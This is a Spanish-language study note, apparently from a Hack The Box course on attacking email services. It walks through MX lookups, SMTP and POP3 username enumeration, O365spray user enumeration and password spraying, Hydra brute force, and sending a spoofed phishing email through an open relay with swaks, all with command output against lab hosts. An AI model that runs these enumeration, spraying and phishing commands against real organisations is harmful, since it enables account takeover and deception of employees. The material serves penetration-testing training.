---
tags:
---


# POR ORGANIZAR

Podemos usar el `Mail eXchanger` (`MX`) Registro DNS para identificar un servidor de correo. El registro MX especifica el servidor de correo responsable de aceptar mensajes de correo electrónico en nombre de un nombre de dominio. Es posible configurar varios registros MX, generalmente apuntando a una matriz de servidores de correo para el equilibrio de carga y la redundancia.

Podemos utilizar herramientas como `host` o `dig` y sitios web en línea como [MXToolbox](https://mxtoolbox.com/) para consultar información sobre los registros MX:

#### Anfitrión - MX Records

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ host -t MX hackthebox.eu

hackthebox.eu mail is handled by 1 aspmx.l.google.com.
```

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ host -t MX microsoft.com

microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.
```

#### DIG - Registros MX

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ dig mx plaintext.do | grep "MX" | grep -v ";"

plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
plaintext.do.           7076    IN      MX      10 mx.zoho.com.
plaintext.do.           7076    IN      MX      20 mx2.zoho.com.
```

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ dig mx inlanefreight.com | grep "MX" | grep -v ";"

inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.
```

#### Anfitrión - A Records

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ host -t A mail1.inlanefreight.htb.

mail1.inlanefreight.htb has address 10.129.14.128
```




Si estamos apuntando a una implementación personalizada del servidor de correo, como `inlanefreight.htb`, podemos enumerar los siguientes puertos:

|**Puerto**|**Servicio**|
|---|---|
|`TCP/25`|SMTP Sin cifrar|
|`TCP/143`|IMAP4 Sin cifrar|
|`TCP/110`|POP3 Sin cifrar|
|`TCP/465`|SMTP Cifrado|
|`TCP/587`|SMTP Cifrado/[ARRANQUE](https://en.wikipedia.org/wiki/Opportunistic_TLS)|
|`TCP/993`|IMAP4 Cifrado|
|`TCP/995`|POP3 Cifrado|


#### Autenticación

El servidor SMTP tiene diferentes comandos que se pueden utilizar para enumerar nombres de usuario válidos `VRFY`, `EXPN`, y `RCPT TO`. Si enumeramos con éxito nombres de usuario válidos, podemos intentar rociar contraseñas, forzar brutas o adivinar una contraseña válida. Así que exploremos cómo funcionan esos comandos.

`VRFY`este comando indica al servidor SMTP receptor que verifique la validez de un nombre de usuario de correo electrónico en particular. El servidor responderá, indicando si el usuario existe o no. Esta característica se puede desactivar.

#### Comando VRFY

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


VRFY root

252 2.0.0 root


VRFY www-data

252 2.0.0 www-data


VRFY new-user

550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```

`EXPN` es similar a `VRFY`, excepto que cuando se usa con una lista de distribución, enumerará a todos los usuarios en esa lista. Esto puede ser un problema mayor que el `VRFY` comando ya que los sitios a menudo tienen un alias como "todos."

#### Comando EXPN

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


EXPN john

250 2.1.0 john@inlanefreight.htb


EXPN support-team

250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```

`RCPT TO`identifica al destinatario del mensaje de correo electrónico. Este comando se puede repetir varias veces para que un mensaje dado entregue un solo mensaje a múltiples destinatarios.

#### RCPT AL Mando

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok


RCPT TO:julio

550 5.1.1 julio... User unknown


RCPT TO:kate

550 5.1.1 kate... User unknown


RCPT TO:john

250 2.1.5 john... Recipient ok
```

También podemos usar el `POP3` protocolo para enumerar usuarios dependiendo de la implementación del servicio. Por ejemplo, podemos usar el comando `USER` seguido por el nombre de usuario, y si el servidor responde `OK`. Esto significa que el usuario existe en el servidor.

#### Comando de USUARIO

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ telnet 10.10.110.20 110

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
+OK POP3 Server ready

USER julio

-ERR


USER john

+OK
```


Para automatizar nuestro proceso de enumeración, podemos usar una herramienta llamada [smtp-usuario-enum](https://github.com/pentestmonkey/smtp-user-enum). Podemos especificar el modo de enumeración con el argumento `-M` seguido de `VRFY`, `EXPN`, o `RCPT`y el argumento `-U` con un archivo que contiene la lista de usuarios que queremos enumerar. Dependiendo de la implementación del servidor y el modo de enumeración, necesitamos agregar el dominio para la dirección de correo electrónico con el argumento `-D`. Finalmente, especificamos el objetivo con el argumento `-t`.

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... userlist.txt
Target count ............. 1
Username count ........... 78
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Thu Apr 21 06:53:07 2022 #########
10.129.203.7: jose@inlanefreight.htb exists
10.129.203.7: pedro@inlanefreight.htb exists
10.129.203.7: kate@inlanefreight.htb exists
######## Scan completed at Thu Apr 21 06:53:18 2022 #########
3 results.

78 queries in 11 seconds (7.1 queries / sec)
```


## Enumeración de Nube

Como se discutió, los proveedores de servicios en la nube utilizan su propia implementación para los servicios de correo electrónico. Esos servicios comúnmente tienen características personalizadas que podemos abusar para la operación, como la enumeración de nombres de usuario. Usemos Office 365 como ejemplo y exploremos cómo podemos enumerar los nombres de usuario en esta plataforma en la nube.

[O365spray](https://github.com/0xZDH/o365spray) es una herramienta de enumeración de nombre de usuario y rociado de contraseña dirigida a Microsoft Office 365 (O365) desarrollada por [ZDH](https://twitter.com/0xzdh). Esta herramienta reimplementa una colección de técnicas de enumeración y pulverización investigadas e identificadas por las mencionadas en [Agradecimientos](https://github.com/0xZDH/o365spray#Acknowledgments). Primero validemos si nuestro dominio de destino está utilizando Office 365.

#### O365 Spray

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ python3 o365spray.py --validate --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > validate       :  True
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:46:40

>----------------------------------------<

[2022-04-13 09:46:40,344] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz
```

Ahora, podemos intentar identificar nombres de usuario.

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
                                       
            *** O365 Spray ***             

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > enum           :  True
   > userfile       :  users.txt
   > enum_module    :  office
   > rate           :  10 threads
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:48:03

>----------------------------------------<

[2022-04-13 09:48:03,621] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:48:04,062] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-13 09:48:04,064] INFO : Running user enumeration against 67 potential users
[2022-04-13 09:48:08,244] INFO : [VALID] lewen@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : [VALID] juurena@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : 

[ * ] Valid accounts can be found at: '/opt/o365spray/enum/enum_valid_accounts.2204130948.txt'
[ * ] All enumerated accounts can be found at: '/opt/o365spray/enum/enum_tested_accounts.2204130948.txt'

[2022-04-13 09:48:10,416] INFO : Valid Accounts: 2
```


## Ataques de Contraseña

Podemos usar `Hydra` para realizar un spray de contraseña o fuerza bruta contra servicios de correo electrónico como `SMTP`, `POP3`, o `IMAP4`. Primero, necesitamos obtener una lista de nombres de usuario y una lista de contraseñas y especificar qué servicio queremos atacar. Veamos un ejemplo para `POP3`.

#### Hydra - Ataque de Contraseña

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:46
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 67 login tries (l:67/p:1), ~5 tries per task
[DATA] attacking pop3://10.10.110.20:110/
[110][pop3] host: 10.129.42.197   login: john   password: Company01!
1 of 1 target successfully completed, 1 valid password found
```


#### O365 Spray - Pulverización con contraseña

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > spray          :  True
   > password       :  March2022!
   > userfile       :  usersfound.txt
   > count          :  1 passwords/spray
   > lockout        :  1.0 minutes
   > spray_module   :  oauth2
   > rate           :  10 threads
   > safe           :  10 locked accounts
   > timeout        :  25 seconds
   > start          :  2022-04-14 12:26:31

>----------------------------------------<

[2022-04-14 12:26:31,757] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-14 12:26:32,201] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-14 12:26:32,202] INFO : Running password spray against 2 users.
[2022-04-14 12:26:32,202] INFO : Password spraying the following passwords: ['March2022!']
[2022-04-14 12:26:33,025] INFO : [VALID] lewen@msplaintext.xyz:March2022!
[2022-04-14 12:26:33,048] INFO : 

[ * ] Writing valid credentials to: '/opt/o365spray/spray/spray_valid_credentials.2204141226.txt'
[ * ] All sprayed credentials can be found at: '/opt/o365spray/spray/spray_tested_credentials.2204141226.txt'

[2022-04-14 12:26:33,048] INFO : Valid Credentials: 1
```


## Ataques Específicos de Protocolo

Un relé abierto es un Protocolo Simple de Transferencia de Correo (`SMTP`) servidor, que está configurado incorrectamente y permite un retransmisión de correo electrónico no autenticado. Los servidores de mensajería que se configuran accidental o intencionalmente como relés abiertos permiten que el correo de cualquier fuente se redireccione de forma transparente a través del servidor de retransmisión abierto. Este comportamiento enmascara la fuente de los mensajes y hace que parezca que el correo se originó en el servidor de retransmisión abierto.

#### Retransmisión Abierta

Desde el punto de vista de un atacante, podemos abusar de esto para phishing enviando correos electrónicos como usuarios no existentes o falsificando el correo electrónico de otra persona. Por ejemplo, imagine que estamos apuntando a una empresa con un servidor de correo de retransmisión abierto, e identificamos que usan una dirección de correo electrónico específica para enviar notificaciones a sus empleados. Podemos enviar un correo electrónico similar usando la misma dirección y agregar nuestro enlace de phishing con esta información. Con el `nmap smtp-open-relay` script, podemos identificar si un puerto SMTP permite un relé abierto.

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT
Nmap scan report for 10.10.11.213
Host is up (0.28s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)
```

A continuación, podemos utilizar cualquier cliente de correo para conectarnos al servidor de correo y enviar nuestro correo electrónico.

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213

=== Trying 10.10.11.213:25...
=== Connected to 10.10.11.213.
<-  220 mail.localdomain SMTP Mailer ready
 -> EHLO parrot
<-  250-mail.localdomain
<-  250-SIZE 33554432
<-  250-8BITMIME
<-  250-STARTTLS
<-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
<-  250 HELP
 -> MAIL FROM:<notifications@inlanefreight.com>
<-  250 OK
 -> RCPT TO:<employees@inlanefreight.com>
<-  250 OK
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Thu, 29 Oct 2020 01:36:06 -0400
 -> To: employees@inlanefreight.com
 -> From: notifications@inlanefreight.com
 -> Subject: Company Notification
 -> Message-Id: <20201029013606.775675@parrot>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
 -> 
 -> 
 -> .
<-  250 OK
 -> QUIT
<-  221 Bye
=== Connection closed with remote host.
```


